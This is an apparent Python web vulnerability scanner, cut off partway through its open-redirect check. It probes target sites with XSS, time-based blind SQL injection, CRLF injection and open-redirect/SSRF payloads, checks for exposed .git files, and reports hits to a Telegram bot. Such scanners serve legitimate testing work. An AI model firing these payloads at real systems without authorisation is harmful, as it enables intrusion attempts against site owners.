import re 
import requests
import random
import sys
import threading
import queue
from multiprocessing import Process
from core import bot
from core import regex

from requests.packages import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

threads =30
USR_AGENTS=regex.USR_AGENTS

def response_time(url):
    user_agent=random.choice(USR_AGENTS)
    headers = {'User-Agent': user_agent } 
    try:
        r = requests.get(url,headers=headers,verify=False)   
        r_time = int(r.elapsed.total_seconds())
        return r_time
    except:
        pass

def rev(str_):
        linth=len(str_)
        rs=''
        for x in range(linth+1):
            if x ==0:
                pass
            else:
                b=str_[-x]
                rs+=b
        return rs

def build_wordlist(urls):
    words= queue.Queue()
    for word in urls:
        word = word.rstrip()
        words.put(word)
    return words

def rootdomain(url):
    try:
        if (url.split('/')[3]):
           return True
        else:
           return False
    except:
        pass

def xss_(link):
    XSS={'a<T"rSAF45>':'a%3CT%22rSAF45%3E.x','a<T"rSAF45.x':'a%3CT%22rSAF45.x','TrS"AF45<':'TrS%22AF45%3C','<TrSA"AF45':'<TrSA"AF45.x',
'TrSAAFF"45<':'TrSAAFF"45<','TrSAA"F45<':'TrSAA%22F45%3C','TrSA"AF45>':'TrSA"AF45>','Tr"SA<F45':'Tr%22SA%3CF45',
'TrSA>F"45':'TrSA%3EF%2245','TrSA<AF4"5':'TrSA<AF4"5','T"rSA>AF45':'T"rSA>AF45'}
    for rg,p in XSS.items():
            
        user_agent=random.choice(USR_AGENTS)
        headers = {'User-Agent': user_agent } 
        url=link+'/'+p
        try:
            
            r = requests.get(url ,headers=headers ,verify=False )       
            resp = r.content
            ContentType=r.headers.get('Content-Type')
            x = re.findall(rg, str(resp))
            if (x):
                if 'text/html' in str(ContentType):
                    print('\033[91mPossibly XSS vulnerability\033[00m  '+url)
                    msg="Possibly XSS vulnerability "+url
                    bot.telegram_bot_sendtext(msg)
                        
                else:
                    print('\033[33;1mWarning can be false positives \033[00m')
                    print('\033[91mPossibly XSS vulnerability\033[00m  '+url)
                    msg="Possibly XSS vulnerability "+url
                    bot.telegram_bot_sendtext(msg)
            
        except:
            pass
                          
    if  rootdomain(link) == True:
        pass
    else:
        link=link+'/'   
    pay="?q=a%3CT%22rSAF45&s=a%3CT%22rSAF45&search=a%3CT%22rSAF45&id=a%3CT%22rSAF45&action=a%3CT%22rSAF45&keyword=a%3CT%22rSAF45&query=a%3CT%22rSAF45&page=a%3CT%22rSAF45&keywords=a%3CT%22rSAF45&url=a%3CT%22rSAF45&view=a%3CT%22rSAF45&cat=a%3CT%22rSAF45&name=a%3CT%22rSAF45&key=a%3CT%22rSAF45&p=a%3CT%22rSAF45"
    rg1='a<T"rSAF45'        
    user_agent=random.choice(USR_AGENTS)
    headers = {'User-Agent': user_agent }
    url1=link+pay
   
    try:
        r1 = requests.get(url1 ,headers=headers ,verify=False )
        resp1 = r1.content 
        ContentType=r1.headers.get('Content-Type')   
        x1 = re.findall(rg1, str(resp1))
        if (x1):
            if 'text/html' in str(ContentType):
                print('\033[91mPossibly XSS vulnerability\033[00m  '+url1)
                msg="Possibly XSS vulnerability "+url
                bot.telegram_bot_sendtext(msg)
            else:
                print('\033[33;1mWarning can be false positives \033[00m')
                print('\033[91mPossibly XSS vulnerability\033[00m  '+url1)
                msg="Possibly XSS vulnerability "+url
                bot.telegram_bot_sendtext(msg)
                              
    except:
        pass
def sqlinjection(url):
  
    SQL_INJECTION_ERROR_BASE={
    "%20OR%201=1%20":"%20OR%201=0%20",
    "%20OR%20x=x":"%20OR%20x=y",
    "%20OR%201=1#":"%20OR%201=0#",
    "%20OR%20x=x#":"%20OR%20x=y#",
    "%20OR%201=1--":"%20OR%201=0--",
    "%20OR%201=1":"%20OR%201=0",
    "%20OR%20x=x--":"%20OR%20x=y--",
    "%20OR%203409=3409%20AND%20('pytW'%20LIKE%20'pytW":"%20OR%203409=3409%20AND%20('pytW'%20LIKE%20'pytY",
    "%20HAVING%201=1":"%20HAVING%201=0",
    "%20HAVING%201=1#":"%20HAVING%201=0#",
    "%20HAVING%201=1--%20":"%20HAVING%201=0--%20",
    "%20AND%201=1%20":"%20AND%201=0%20",
    "%20AND%201=1":"%20AND%201=0",
    "%20AND%201=1--%20":"%20AND%201=0--%20",
    "%20AND%201=1#":"%20AND%201=0#",
    "%20AND%201=1%20AND%20'%'='":"%20AND%201=0%20AND%20'%'='",
    "%20AND%201083=1083%20AND%20(1427=1427":"%20AND%207506=9091%20AND%20(5913=5913",
    "%20AND%201083=1083%20AND%20('1427=1427":"%20AND%207506=9091%20AND%20('5913=5913",
    "%20AND%207300=7300%20AND%20'pKlZ'='pKlZ":"%20AND%207300=7300%20AND%20'pKlZ'='pKlY",
    "%20AND%207300=7300%20AND%20('pKlZ'='pKlZ":"%20AND%207300=7300%20AND%20('pKlZ'='pKlY",
    "%20AS%20INJECTX%20WHERE%201=1%20AND%201=1":"%20AS%20INJECTX%20WHERE%201=1%20AND%201=0",
    "%20AS%20INJECTX%20WHERE%201=1%20AND%201=1#":"%20AS%20INJECTX%20WHERE%201=1%20AND%201=0#",
    "%20AS%20INJECTX%20WHERE%201=1%20AND%201=1--":"%20AS%20INJECTX%20WHERE%201=1%20AND%201=0--",
    "%20WHERE%201=1%20AND%201=1":"%20WHERE%201=1%20AND%201=0",
    "%20WHERE%201=1%20AND%201=1#":"%20WHERE%201=1%20AND%201=0#",
    "%20WHERE%201=1%20AND%201=1--":"%20WHERE%201=1%20AND%201=0--",}
    SQL_INJECTION_BLIND_BASE=[
    '%20 0"XOR(if(now()=sysdate(),sleep({}),0))XOR"Z',
    '%20 0"XOR(if(now()=sysdate(),sleep({}),0))XOR”Z',
    "%20AnD%20SLEEP({})",
    "%20AnD%20SLEEP({})--",
    "%20AnD%20SLEEP({})#",
    "%20&&SLEEP({})",
    "%20&&SLEEP({})--",
    "%20&&SLEEP({})#",
    "%20SLEEP({})#",
    "'%20AnD%20SLEEP({})%20ANd%20'1",
    "%20'&&SLEEP({})&&'1",
    "%20ORDER%20BY%20SLEEP({})",
    "%20ORDER%20BY%20SLEEP({})--",
    "%20ORDER%20BY%20SLEEP({})#",
    "(SELECT%20*%20FROM%20(SELECT(SLEEP({})))ecMj)",
    "%20(SELECT%20*%20FROM%20(SELECT(SLEEP({})))ecMj)#",
    "(SELECT%20*%20FROM%20(SELECT(SLEEP({})))ecMj)--",
    "%20+%20SLEEP({})%20+%20'",
    "%20SLEEP({})/*",
    "%20SLEEP({})",
    '%20or%20SLEEP({})',
    '''"or%20SLEEP({})%20or%20"*/''',
    '%2b(select*from(select(sleep({})))a)%2b',
    ";WAITFOR DELAY '0:0:{}'--",
    " WAITFOR DELAY '0:0:{}'",
    "%20;WAITFOR DELAY '0:0:{}'--",
    "%20WAITFOR DELAY '0:0:{}'",
    ]

    #try:
       # r1=requests.get(url+'test',verify=False,timeout=13).text
       # r2=requests.get(url+'test',verify=False,timeout=13).text
       # if len(r1)==len(r2) :
         #   for god,bad in SQL_INJECTION_ERROR_BASE.items():
                
           #     r1=requests.get(url+god,verify=False,timeout=13)
           #     god_r=r1.content
            #    sr1=r1.status_code
           #     r2=requests.get(url+bad,verify=False,timeout=13)
           #     bad_r=r2.content
            #    sr2=r2.status_code
             #  if len(god_r) != len(bad_r) or sr1 != sr2:
                    
              #      print("\033[91mPossibly SQL injection vulnerability\033[00m  ")
               #     print(url+god+' | response Length:'+str(len(god_r))+'  status code: '+str(sr1)+'\n'+url+bad+' | response Length:'+str(len(bad_r))+'  status code: '+str(sr1))
                        
                    
   # except:
    #    pass


    try:
        for x in SQL_INJECTION_BLIND_BASE:
            
                
                r1=url+x.format('3')
               
                rs1=response_time(r1)
                
                r2=url+x.format('6')
               
                rs2=response_time(r2)
               
                r3=url+x.format('9')
                
                rs3=response_time(r3)
                
              
                if int(rs1) < int(rs2) and int(rs1) < int(rs3):
                    if int(rs2) > int(rs1) and int(rs2) < int(rs3):
                           if int(rs3) > int(rs1) and int(rs3) > int(rs2):
                                rr=url+x.format('0')
                                rs=response_time(rr)
                                if int(rs) < int(rs1)  and int(rs) <  int(rs2) and int(rs) < int(rs3):
                                    
                                    
                                    print("\033[91mPossibly SQL injection vulnerability\033[00m  \n"+r1+' | Response time:'+'\033[32m'+str(rs1)+'\033[00m'+'\n'+r2+' | Response time:'+'\033[32m'+str(rs2)+'\033[00m'+'\n'+r3+' | Response time:'+'\033[32m'+str(rs3)+'\033[00m')
                                    break
                           
                               
    except:
        pass



               
def git_(i):
    
   
    user_agent=random.choice(USR_AGENTS)
    headers = {'User-Agent': user_agent } 
    url=i+'/.git/HEAD'
    try:
        r = requests.get(url ,headers=headers ,verify=False )       
        resp = r.content
        x = re.findall('refs/heads', str(resp))
        if (x):
            print('\033[91mPossibly exposes Git configuration\033[00m  '+url)
            msg="Possibly exposes Git configuration fond  "+url
            bot.telegram_bot_sendtext(msg)
    except:
        pass


def crlf_(i):
   
    lis=["%0D%0ASet-Cookie:crlfinjection=crlfinjection","%E5%98%8D%E5%98%8ASet-Cookie:crlfinjection=crlfinjection","%0DSet-Cookie:crlfinjection=crlfinjection","%0ASet-Cookie:crlfinjection=crlfinjection","%3F%0DSet-Cookie%3Acrlfinjection=crlfinjection","%0ASet-Cookie%3Acrlfinjection/..","~user/%0D%0ASet-Cookie:crlfinjection","?Page=%0D%0ASet-Cookie:crlfinjection=crlfinjection&_url=%0D%0ASet-Cookie:crlfinjection=crlfinjection&callback=%0D%0ASet-Cookie:crlfinjection=crlfinjection&checkout_url=%0D%0ASet-Cookie:crlfinjection=crlfinjection&content=%0D%0ASet-Cookie:crlfinjection=crlfinjection&continue=%0D%0ASet-Cookie:crlfinjection=crlfinjection&continueTo=%0D%0ASet-Cookie:crlfinjection=crlfinjection&counturl=%0D%0ASet-Cookie:crlfinjection=crlfinjection&data=%0D%0ASet-Cookie:crlfinjection=crlfinjection&dest=%0D%0ASet-Cookie:crlfinjection=crlfinjection&dest_url=%0D%0ASet-Cookie:crlfinjection=crlfinjection&dir=%0D%0ASet-Cookie:crlfinjection=crlfinjection&document=%0D%0ASet-Cookie:crlfinjection=crlfinjection&domain=%0D%0ASet-Cookie:crlfinjection=crlfinjection&done=%0D%0ASet-Cookie:crlfinjection=crlfinjection&download=%0D%0ASet-Cookie:crlfinjection=crlfinjection&feed=%0D%0ASet-Cookie:crlfinjection=crlfinjection&file=%0D%0ASet-Cookie:crlfinjection=crlfinjection&host=%0D%0ASet-Cookie:crlfinjection=crlfinjection&html=%0D%0ASet-Cookie:crlfinjection=crlfinjection&http=%0D%0ASet-Cookie:crlfinjection=crlfinjection&https=%0D%0ASet-Cookie:crlfinjection=crlfinjection&image=%0D%0ASet-Cookie:crlfinjection=crlfinjection&image_src=%0D%0ASet-Cookie:crlfinjection=crlfinjection&image_url=%0D%0ASet-Cookie:crlfinjection=crlfinjection&imageurl=%0D%0ASet-Cookie:crlfinjection=crlfinjection&include=%0D%0ASet-Cookie:crlfinjection=crlfinjection&media=%0D%0ASet-Cookie:crlfinjection=crlfinjection&navigation=%0D%0ASet-Cookie:crlfinjection=crlfinjection&next=%0D%0ASet-Cookie:crlfinjection=crlfinjection&open=%0D%0ASet-Cookie:crlfinjection=crlfinjection&out=%0D%0ASet-Cookie:crlfinjection=crlfinjection&page=%0D%0ASet-Cookie:crlfinjection=crlfinjection&page_url=%0D%0ASet-Cookie:crlfinjection=crlfinjection&pageurl=%0D%0ASet-Cookie:crlfinjection=crlfinjection&path=%0D%0ASet-Cookie:crlfinjection=crlfinjection&picture=%0D%0ASet-Cookie:crlfinjection=crlfinjection&port=%0D%0ASet-Cookie:crlfinjection=crlfinjection&proxy=%0D%0ASet-Cookie:crlfinjection=crlfinjection&redir=%0D%0ASet-Cookie:crlfinjection=crlfinjection&redirect=%0D%0ASet-Cookie:crlfinjection=crlfinjection&redirectUri&redirectUrl=%0D%0ASet-Cookie:crlfinjection=crlfinjection&reference=%0D%0ASet-Cookie:crlfinjection=crlfinjection&referrer=%0D%0ASet-Cookie:crlfinjection=crlfinjection&req=%0D%0ASet-Cookie:crlfinjection=crlfinjection&request=%0D%0ASet-Cookie:crlfinjection=crlfinjection&retUrl=%0D%0ASet-Cookie:crlfinjection=crlfinjection&return=%0D%0ASet-Cookie:crlfinjection=crlfinjection&returnTo=%0D%0ASet-Cookie:crlfinjection=crlfinjection&return_path=%0D%0ASet-Cookie:crlfinjection=crlfinjection&return_to=%0D%0ASet-Cookie:crlfinjection=crlfinjection&rurl=%0D%0ASet-Cookie:crlfinjection=crlfinjection&show=%0D%0ASet-Cookie:crlfinjection=crlfinjection&site=%0D%0ASet-Cookie:crlfinjection=crlfinjection&source=%0D%0ASet-Cookie:crlfinjection=crlfinjection&src=%0D%0ASet-Cookie:crlfinjection=crlfinjection&target=%0D%0ASet-Cookie:crlfinjection=crlfinjection&to=%0D%0ASet-Cookie:crlfinjection=crlfinjection&uri=%0D%0ASet-Cookie:crlfinjection=crlfinjection&url=%0D%0ASet-Cookie:crlfinjection=crlfinjection&val=%0D%0ASet-Cookie:crlfinjection=crlfinjection&validate=%0D%0ASet-Cookie:crlfinjection=crlfinjection&view=%0D%0ASet-Cookie:crlfinjection=crlfinjection&window=%0D%0ASet-Cookie:crlfinjection=crlfinjection&redirect_to=%0D%0ASet-Cookie:crlfinjection=crlfinjection"]
    regix='(?m)^(?:Set-Cookie\s*?:(?:\s*?|.*?;\s*?))(crlfinjection=crlfinjection)(?:\s*?)(?:$|;)'
    for x in lis:
        x=x.rstrip()
        url=i+'/'+x
        try:
            r = requests.get(url,verify=False)
            resp = r.content
            x = re.findall(regix, str(resp))
            if (x):
                print('\033[91mPossibly crlf injection vulnerability\033[00m  '+url)
                msg="Possibly CRLF injection vulnerability "+url
                bot.telegram_bot_sendtext(msg)
        except:
            pass


def openredaraction_(i):
   
    lis=["/#/path///omeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net","omeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net/",
    "omeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net//","//;@omeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net",
    "//omeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net/%2F..","////omeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net",
    "/omeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net/%2F..","/omeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net/..;/css",
    "evil%E3%80%82com","%5Comeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net","b21lZzBpdm43azk1d2xveWV6YWg3emNxZ2htN2F3LmJ1cnBjb2xsYWJvcmF0b3IubmV0=","aHR0cDovL29tZWcwaXZuN2s5NXdsb3llemFoN3pjcWdobTdhdy5idXJwY29sbGFib3JhdG9yLm5ldA=="]
    
    
    for x in lis:
        x=x.rstrip()
        url=i+'/'+x
        user_agent=random.choice(USR_AGENTS)
        headers = {'User-Agent': user_agent }
        try:
            r = requests.get(url,headers=headers,verify=False)
            
            cont=r.content
            if 'k6unx4pudf8k5itoapaxjwzjigz' in str(cont):
                if r.history :
                    print('\033[91m Possibly open redirection vulnerability\033[00m '+url) 
                    msg="Possibly open redrection vulnerability "+url
                    bot.telegram_bot_sendtext(msg)   
                else:
                    print('\033[91m Possibly SSRF vulnerability\033[00m '+url) 
                    msg="Possibly SSRF vulnerability "+url
                    bot.telegram_bot_sendtext(msg) 

        except :
            pass


    lis2=["?Page=omeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net&_url=omeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net&callback=omeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net&checkout_url=omeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net&content=omeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net&continue=omeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net&continueTo=omeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net&counturl=omeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net&data=omeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net&dest=omeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net&dest_url=omeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net&dir=omeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net&document=omeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net&domain=omeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net&done=omeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net&download=omeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net&feed=omeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net&file=omeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net&host=omeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net&html=omeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net&http=omeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net&https=omeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net&image=omeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net&image_src=omeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net&image_url=omeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net&imageurl=omeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net&include=omeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net&langTo=omeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net&media=omeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net&navigation=omeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net&next=omeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net&open=omeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net&out=omeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net&page=omeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net&page_url=omeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net&pageurl=omeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net&path=omeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net&picture=omeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net&port=omeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net&proxy=omeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net&redir=omeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net&redirect=omeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net&redirectUri=omeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net&redirectUrl=omeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net&reference=omeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net&referrer=omeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net&req=omeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net&request=omeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net&retUrl=omeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net&return=omeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net&returnTo=omeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net&return_path=omeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net&return_to=omeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net&rurl=omeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net&show=omeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net&site=omeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net&source=omeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net&src=omeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net&target=omeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net&to=omeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net&uri=omeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net&url=omeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net&val=omeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net&validate=omeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net&view=omeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net&window=omeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net&redirect_to=omeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net",
    "?Page=b21lZzBpdm43azk1d2xveWV6YWg3emNxZ2htN2F3LmJ1cnBjb2xsYWJvcmF0b3IubmV0=&_url=b21lZzBpdm43azk1d2xveWV6YWg3emNxZ2htN2F3LmJ1cnBjb2xsYWJvcmF0b3IubmV0=&callback=b21lZzBpdm43azk1d2xveWV6YWg3emNxZ2htN2F3LmJ1cnBjb2xsYWJvcmF0b3IubmV0=&checkout_url=b21lZzBpdm43azk1d2xveWV6YWg3emNxZ2htN2F3LmJ1cnBjb2xsYWJvcmF0b3IubmV0=&content=b21lZzBpdm43azk1d2xveWV6YWg3emNxZ2htN2F3LmJ1cnBjb2xsYWJvcmF0b3IubmV0=&continue=b21lZzBpdm43azk1d2xveWV6YWg3emNxZ2htN2F3LmJ1cnBjb2xsYWJvcmF0b3IubmV0=&continueTo=b21lZzBpdm43azk1d2xveWV6YWg3emNxZ2htN2F3LmJ1cnBjb2xsYWJvcmF0b3IubmV0=&counturl=b21lZzBpdm43azk1d2xveWV6YWg3emNxZ2htN2F3LmJ1cnBjb2xsYWJvcmF0b3IubmV0=&data=b21lZzBpdm43azk1d2xveWV6YWg3emNxZ2htN2F3LmJ1cnBjb2xsYWJvcmF0b3IubmV0=&dest=b21lZzBpdm43azk1d2xveWV6YWg3emNxZ2htN2F3LmJ1cnBjb2xsYWJvcmF0b3IubmV0=&dest_url=b21lZzBpdm43azk1d2xveWV6YWg3emNxZ2htN2F3LmJ1cnBjb2xsYWJvcmF0b3IubmV0=&dir=b21lZzBpdm43azk1d2xveWV6YWg3emNxZ2htN2F3LmJ1cnBjb2xsYWJvcmF0b3IubmV0=&document=b21lZzBpdm43azk1d2xveWV6YWg3emNxZ2htN2F3LmJ1cnBjb2xsYWJvcmF0b3IubmV0=&domain=b21lZzBpdm43azk1d2xveWV6YWg3emNxZ2htN2F3LmJ1cnBjb2xsYWJvcmF0b3IubmV0=&done=b21lZzBpdm43azk1d2xveWV6YWg3emNxZ2htN2F3LmJ1cnBjb2xsYWJvcmF0b3IubmV0=&download=b21lZzBpdm43azk1d2xveWV6YWg3emNxZ2htN2F3LmJ1cnBjb2xsYWJvcmF0b3IubmV0=&feed=b21lZzBpdm43azk1d2xveWV6YWg3emNxZ2htN2F3LmJ1cnBjb2xsYWJvcmF0b3IubmV0=&file=b21lZzBpdm43azk1d2xveWV6YWg3emNxZ2htN2F3LmJ1cnBjb2xsYWJvcmF0b3IubmV0=&host=b21lZzBpdm43azk1d2xveWV6YWg3emNxZ2htN2F3LmJ1cnBjb2xsYWJvcmF0b3IubmV0=&html=b21lZzBpdm43azk1d2xveWV6YWg3emNxZ2htN2F3LmJ1cnBjb2xsYWJvcmF0b3IubmV0=&http=b21lZzBpdm43azk1d2xveWV6YWg3emNxZ2htN2F3LmJ1cnBjb2xsYWJvcmF0b3IubmV0=&https=b21lZzBpdm43azk1d2xveWV6YWg3emNxZ2htN2F3LmJ1cnBjb2xsYWJvcmF0b3IubmV0=&image=b21lZzBpdm43azk1d2xveWV6YWg3emNxZ2htN2F3LmJ1cnBjb2xsYWJvcmF0b3IubmV0=&image_src=b21lZzBpdm43azk1d2xveWV6YWg3emNxZ2htN2F3LmJ1cnBjb2xsYWJvcmF0b3IubmV0=&image_url=b21lZzBpdm43azk1d2xveWV6YWg3emNxZ2htN2F3LmJ1cnBjb2xsYWJvcmF0b3IubmV0=&imageurl=b21lZzBpdm43azk1d2xveWV6YWg3emNxZ2htN2F3LmJ1cnBjb2xsYWJvcmF0b3IubmV0=&include=b21lZzBpdm43azk1d2xveWV6YWg3emNxZ2htN2F3LmJ1cnBjb2xsYWJvcmF0b3IubmV0=&langTo=b21lZzBpdm43azk1d2xveWV6YWg3emNxZ2htN2F3LmJ1cnBjb2xsYWJvcmF0b3IubmV0=&media=b21lZzBpdm43azk1d2xveWV6YWg3emNxZ2htN2F3LmJ1cnBjb2xsYWJvcmF0b3IubmV0=&navigation=b21lZzBpdm43azk1d2xveWV6YWg3emNxZ2htN2F3LmJ1cnBjb2xsYWJvcmF0b3IubmV0=&next=b21lZzBpdm43azk1d2xveWV6YWg3emNxZ2htN2F3LmJ1cnBjb2xsYWJvcmF0b3IubmV0=&open=b21lZzBpdm43azk1d2xveWV6YWg3emNxZ2htN2F3LmJ1cnBjb2xsYWJvcmF0b3IubmV0=&out=b21lZzBpdm43azk1d2xveWV6YWg3emNxZ2htN2F3LmJ1cnBjb2xsYWJvcmF0b3IubmV0=&page=b21lZzBpdm43azk1d2xveWV6YWg3emNxZ2htN2F3LmJ1cnBjb2xsYWJvcmF0b3IubmV0=&page_url=b21lZzBpdm43azk1d2xveWV6YWg3emNxZ2htN2F3LmJ1cnBjb2xsYWJvcmF0b3IubmV0=&pageurl=b21lZzBpdm43azk1d2xveWV6YWg3emNxZ2htN2F3LmJ1cnBjb2xsYWJvcmF0b3IubmV0=&path=b21lZzBpdm43azk1d2xveWV6YWg3emNxZ2htN2F3LmJ1cnBjb2xsYWJvcmF0b3IubmV0=&picture=b21lZzBpdm43azk1d2xveWV6YWg3emNxZ2htN2F3LmJ1cnBjb2xsYWJvcmF0b3IubmV0=&port=b21lZzBpdm43azk1d2xveWV6YWg3emNxZ2htN2F3LmJ1cnBjb2xsYWJvcmF0b3IubmV0=&proxy=b21lZzBpdm43azk1d2xveWV6YWg3emNxZ2htN2F3LmJ1cnBjb2xsYWJvcmF0b3IubmV0=&redir=b21lZzBpdm43azk1d2xveWV6YWg3emNxZ2htN2F3LmJ1cnBjb2xsYWJvcmF0b3IubmV0=&redirect=b21lZzBpdm43azk1d2xveWV6YWg3emNxZ2htN2F3LmJ1cnBjb2xsYWJvcmF0b3IubmV0=&redirectUri=b21lZzBpdm43azk1d2xveWV6YWg3emNxZ2htN2F3LmJ1cnBjb2xsYWJvcmF0b3IubmV0=&redirectUrl=b21lZzBpdm43azk1d2xveWV6YWg3emNxZ2htN2F3LmJ1cnBjb2xsYWJvcmF0b3IubmV0=&reference=b21lZzBpdm43azk1d2xveWV6YWg3emNxZ2htN2F3LmJ1cnBjb2xsYWJvcmF0b3IubmV0=&referrer=b21lZzBpdm43azk1d2xveWV6YWg3emNxZ2htN2F3LmJ1cnBjb2xsYWJvcmF0b3IubmV0=&req=b21lZzBpdm43azk1d2xveWV6YWg3emNxZ2htN2F3LmJ1cnBjb2xsYWJvcmF0b3IubmV0=&request=b21lZzBpdm43azk1d2xveWV6YWg3emNxZ2htN2F3LmJ1cnBjb2xsYWJvcmF0b3IubmV0=&retUrl=b21lZzBpdm43azk1d2xveWV6YWg3emNxZ2htN2F3LmJ1cnBjb2xsYWJvcmF0b3IubmV0=&return=b21lZzBpdm43azk1d2xveWV6YWg3emNxZ2htN2F3LmJ1cnBjb2xsYWJvcmF0b3IubmV0=&returnTo=b21lZzBpdm43azk1d2xveWV6YWg3emNxZ2htN2F3LmJ1cnBjb2xsYWJvcmF0b3IubmV0=&return_path=b21lZzBpdm43azk1d2xveWV6YWg3emNxZ2htN2F3LmJ1cnBjb2xsYWJvcmF0b3IubmV0=&return_to=b21lZzBpdm43azk1d2xveWV6YWg3emNxZ2htN2F3LmJ1cnBjb2xsYWJvcmF0b3IubmV0=&rurl=b21lZzBpdm43azk1d2xveWV6YWg3emNxZ2htN2F3LmJ1cnBjb2xsYWJvcmF0b3IubmV0=&show=b21lZzBpdm43azk1d2xveWV6YWg3emNxZ2htN2F3LmJ1cnBjb2xsYWJvcmF0b3IubmV0=&site=b21lZzBpdm43azk1d2xveWV6YWg3emNxZ2htN2F3LmJ1cnBjb2xsYWJvcmF0b3IubmV0=&source=b21lZzBpdm43azk1d2xveWV6YWg3emNxZ2htN2F3LmJ1cnBjb2xsYWJvcmF0b3IubmV0=&src=b21lZzBpdm43azk1d2xveWV6YWg3emNxZ2htN2F3LmJ1cnBjb2xsYWJvcmF0b3IubmV0=&target=b21lZzBpdm43azk1d2xveWV6YWg3emNxZ2htN2F3LmJ1cnBjb2xsYWJvcmF0b3IubmV0=&to=b21lZzBpdm43azk1d2xveWV6YWg3emNxZ2htN2F3LmJ1cnBjb2xsYWJvcmF0b3IubmV0=&uri=b21lZzBpdm43azk1d2xveWV6YWg3emNxZ2htN2F3LmJ1cnBjb2xsYWJvcmF0b3IubmV0=&url=b21lZzBpdm43azk1d2xveWV6YWg3emNxZ2htN2F3LmJ1cnBjb2xsYWJvcmF0b3IubmV0=&val=b21lZzBpdm43azk1d2xveWV6YWg3emNxZ2htN2F3LmJ1cnBjb2xsYWJvcmF0b3IubmV0=&validate=b21lZzBpdm43azk1d2xveWV6YWg3emNxZ2htN2F3LmJ1cnBjb2xsYWJvcmF0b3IubmV0=&view=b21lZzBpdm43azk1d2xveWV6YWg3emNxZ2htN2F3LmJ1cnBjb2xsYWJvcmF0b3IubmV0=&window=b21lZzBpdm43azk1d2xveWV6YWg3emNxZ2htN2F3LmJ1cnBjb2xsYWJvcmF0b3IubmV0=&redirect_to=b21lZzBpdm43azk1d2xveWV6YWg3emNxZ2htN2F3LmJ1cnBjb2xsYWJvcmF0b3IubmV0=",
